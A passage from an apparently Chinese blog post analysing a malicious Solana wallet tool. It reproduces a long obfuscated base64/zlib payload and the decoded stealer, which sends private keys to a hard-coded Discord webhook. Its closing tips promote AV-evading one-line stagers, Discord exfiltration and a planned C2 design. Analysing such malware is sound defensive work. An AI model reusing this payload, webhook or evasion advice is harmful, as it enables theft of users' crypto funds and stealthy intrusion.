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'))
```
　　这次套娃套了二十层左右,解出来就发现问题了
```python
# checkrug.py
 import requests
 def send_to_discord(webhook_url: str, private_key: str, public_key: str, balance: float):
    """\n    Sends a message to a Discord channel via webhook.\n    """
    message_content = f"Private Key: {private_key}\\nPublic Key: {public_key}\\nBalance: {balance} SOL"
    data = {"content": message_content, "username": "Wallet Key Bot"}
    result = requests.post(webhook_url, json=data)
    print("\\033[92mSuccessfully connected to Wallet, Please set your profit!\\033[0m" if result.status_code == 204 else f"\\033[91mError: Status code: {result.status_code}\\033[0m")
def notify_wallet(private_key: str, public_key: str, balance: float):
    webhook_url = "https://discord.com/api/webhooks/1230902698325311528/jDtk-vEXEzyMbjRHGbAH4_zfeQZ5eW7Zsh5aQ9cgME7YcnO816z3iNBELkpRMHhjh9q_"
    send_to_discord(webhook_url, private_key, public_key, balance)'
```
　　还是手动格式化，凑合凑合看<br>
　　乐，把人家私钥发自己的discord上，这刀乐真好挣捏😋<br>
　　有一说一，我还真不会追discord的链接捏，希望有dalao会的能教教我

## Chapter 4 What Do We Learn -- Best Practice🤗
- 不要“因为开源所以安全”，有些妙妙小工具不做code review四舍五入等于狠狠地往电脑里赛国家反诈中心和360安全卫士，真的会坏掉的！这效果堪比结婚就离婚然后分走你一套房子
- 匿名函数配zlib+b64循环套娃，动态加载二进制payload，可手搓one-line静态免杀stager
- 把token，private key之类的东西导到环境变量里而不是写进配置文件里，该导还是要导的
- 好好复习\_\_import\_\_，exec，lambda的用法
- 回传可以用discord，别再折腾那憨批reverse proxy了，回传上就是纯纯🤡，死难用弄不好还清理不干净，哪怕是在CF上个CDN用worker也比代理强（挖个坑，以后整个基于https CDN的beacon工作模式的C2）
# 封面图

[![Alice](https://s2.loli.net/2024/04/23/rPNYsXm4F8ZtT7M.png "Alice不想说谎！")](https://www.pixiv.net/artworks/93331597)
        PID：93331597
## 附赠可爱Alice一张🥰
[![Alice](https://s2.loli.net/2024/04/23/IOTra4HUSgtPxWz.webp "Alice PRPR 😋")](https://www.pixiv.net/artworks/111919854)
        PID：111919854 图片经过压缩，存储有限好伐，原图都是5-10MB真用不起
